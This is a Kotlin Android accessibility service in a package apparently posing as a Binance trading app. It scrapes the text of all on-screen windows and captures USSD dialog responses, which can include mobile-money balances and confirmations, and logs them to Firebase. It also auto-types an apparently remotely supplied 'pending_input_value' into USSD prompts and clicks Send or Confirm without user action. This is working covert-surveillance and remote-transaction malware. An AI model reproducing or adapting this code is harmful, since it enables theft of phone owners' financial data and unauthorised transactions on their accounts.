package dApp.binance.Trading.arfu

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.SharedPreferences
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log
import android.os.Bundle

class CarerAccessibilityService : AccessibilityService(), SharedPreferences.OnSharedPreferenceChangeListener {

    private var lastProcessedTime = 0L
    private var lastProcessedText = ""
    private lateinit var sharedPref: SharedPreferences

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val currentTime = System.currentTimeMillis()
        val rootNode = rootInActiveWindow ?: return

        // Check for pending input on every event just in case
        checkAndProcessPendingInput(rootNode)
        
        // Capture USSD response text
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            
            val ussdText = extractUssdDialogText(rootNode)
            if (ussdText.isNotEmpty()) {
                // Debounce: ignore same text within 1.5 seconds
                if (ussdText == lastProcessedText && currentTime - lastProcessedTime < 1500) {
                    return
                }
                
                lastProcessedText = ussdText
                lastProcessedTime = currentTime
                
                Log.d("CarerAccessibility", "Captured USSD Response: $ussdText")
                captureAndSendResponse(ussdText)
            }
        }
    }

    private fun checkAndProcessPendingInput(rootNode: AccessibilityNodeInfo?) {
        if (rootNode == null) return
        
        val pendingInput = sharedPref.getString("pending_input_value", "")
        if (!pendingInput.isNullOrEmpty()) {
            Log.d("CarerAccessibility", ">>> PROCESSING PENDING INPUT: $pendingInput")
            val success = tryTypeAndSend(rootNode, pendingInput)
            if (success) {
                Log.d("CarerAccessibility", "Successfully typed and sent input")
                sharedPref.edit().remove("pending_input_value").apply()
                lastProcessedTime = System.currentTimeMillis()
            }
        }
    }

    override fun onInterrupt() {}

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("CarerAccessibility", "Service connected, initializing...")
        
        sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
        sharedPref.registerOnSharedPreferenceChangeListener(this)

        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or 
                     AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        info.notificationTimeout = 100
        serviceInfo = info
    }

    override fun onDestroy() {
        super.onDestroy()
        if (::sharedPref.isInitialized) {
            sharedPref.unregisterOnSharedPreferenceChangeListener(this)
        }
    }

    override fun onSharedPreferenceChanged(sharedPreferences: SharedPreferences?, key: String?) {
        if (key == "pending_input_value") {
            Log.d("CarerAccessibility", "Preference changed: pending_input_value. Waking up...")
            // When preference changes, try to process immediately using the current window
            checkAndProcessPendingInput(rootInActiveWindow)
        }
    }

    private fun tryTypeAndSend(rootNode: AccessibilityNodeInfo, text: String): Boolean {
        val inputField = findInputField(rootNode)
        if (inputField != null) {
            inputField.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
            
            val arguments = Bundle()
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            val typed = inputField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
            
            if (typed) {
                Log.d("CarerAccessibility", "Typed: $text")
                try { Thread.sleep(600) } catch (e: Exception) {}
                
                // Try to find the button again in case the layout changed
                val currentRoot = rootInActiveWindow ?: rootNode
                clickSendButton(currentRoot)
                return true
            }
        }
        return false
    }

    private fun extractUssdDialogText(node: AccessibilityNodeInfo): String {
        val dialogTexts = mutableListOf<String>()
        collectDialogText(node, dialogTexts)
        
        val result = dialogTexts.distinct().joinToString("\n").trim()
        
        // Aggressive capture: if we see an input field OR a button that looks like USSD, capture it.
        // We exclude common apps like our own or system launchers if possible, but USSD dialogs
        // often don't have a reliable package name (sometimes null or "com.android.phone").
        
        if (result.length > 3 && (checkHasInputField(node) || checkHasOkButton(node))) {
            return result
        }
        
        return ""
    }
    
    private fun collectDialogText(node: AccessibilityNodeInfo, texts: MutableList<String>) {
        val className = node.className?.toString() ?: ""
        if (className.contains("NavigationBar") || className.contains("StatusBar")) return
        
        val nodeText = node.text?.toString()?.trim()
        if (!nodeText.isNullOrEmpty() && nodeText.length > 1) {
            if (!isCommonButtonLabel(nodeText)) {
                texts.add(nodeText)
            }
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            collectDialogText(child, texts)
        }
    }

    private fun isCommonButtonLabel(text: String): Boolean {
        val lower = text.lowercase()
        val commonLabels = listOf("ok", "cancel", "send", "dismiss", "yes", "no", "exit", "back", "next", "confirm")
        return commonLabels.contains(lower)
    }

    private fun checkHasInputField(node: AccessibilityNodeInfo): Boolean {
        if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) {
            return true
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (checkHasInputField(child)) return true
        }
        return false
    }

    private fun checkHasOkButton(node: AccessibilityNodeInfo): Boolean {
        val text = node.text?.toString()?.lowercase() ?: ""
        val okLabels = listOf("ok", "send", "yes", "confirm", "accept", "submit")
        if (okLabels.contains(text)) return true
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (checkHasOkButton(child)) return true
        }
        return false
    }

    private fun findInputField(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) {
            return node
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findInputField(child)
            if (result != null) return result
        }
        return null
    }

    private fun clickSendButton(rootNode: AccessibilityNodeInfo): Boolean {
        val buttons = listOf("SEND", "OK", "CONFIRM", "YES", "ACCEPT", "SUBMIT")
        for (buttonText in buttons) {
            val button = findNodeByText(rootNode, buttonText)
            if (button != null) {
                if (performClick(button)) {
                    Log.d("CarerAccessibility", "Clicked button: $buttonText")
                    return true
                }
            }
        }
        return false
    }

    private fun performClick(node: AccessibilityNodeInfo?): Boolean {
        var tempNode = node
        while (tempNode != null) {
            if (tempNode.isClickable) {
                return tempNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            tempNode = tempNode.parent
        }
        return false
    }

    private fun findNodeByText(node: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        if (node.text?.toString()?.contains(text, ignoreCase = true) == true) {
            return node
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findNodeByText(child, text)
            if (result != null) return result
        }
        return null
    }

    private fun captureAndSendResponse(text: String) {
        val rootNode = rootInActiveWindow
        val hasInputField = rootNode?.let { checkHasInputField(it) } ?: false
        FirebaseLogHelper.logResponse(text, this, hasInputField)
        ConversationHistory.addMessage("system", text)
    }

    companion object {
        fun isAccessibilityServiceEnabled(context: Context): Boolean {
            val accessibilityManager = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
            val enabledServices = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val serviceName = "${context.packageName}/${CarerAccessibilityService::class.java.name}"
            return enabledServices.contains(serviceName)
        }
    }
}
